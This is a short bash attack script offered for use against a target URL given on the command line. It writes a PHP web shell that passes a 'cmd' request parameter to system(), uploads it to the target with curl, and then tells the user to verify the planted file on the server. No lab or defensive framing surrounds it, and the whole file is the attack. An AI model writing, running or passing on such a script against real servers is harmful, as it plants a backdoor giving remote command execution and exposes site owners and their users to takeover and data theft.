#!/bin/bash

# Check if target URL is provided
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

TARGET_URL=$1

# Define a malicious file to upload
MALICIOUS_FILE="malicious.php"

# Create a simple PHP payload
cat <<EOF > $MALICIOUS_FILE
<?php
    echo "File upload attack successful!";
    system($_GET['cmd']);
?>
EOF

# Perform the file upload attack using curl
echo "Attempting to upload $MALICIOUS_FILE to $TARGET_URL..."
curl -F "file=@$MALICIOUS_FILE" $TARGET_URL

# Clean up the malicious file
rm $MALICIOUS_FILE

echo "Attack script completed. Verify the uploaded file on the target server."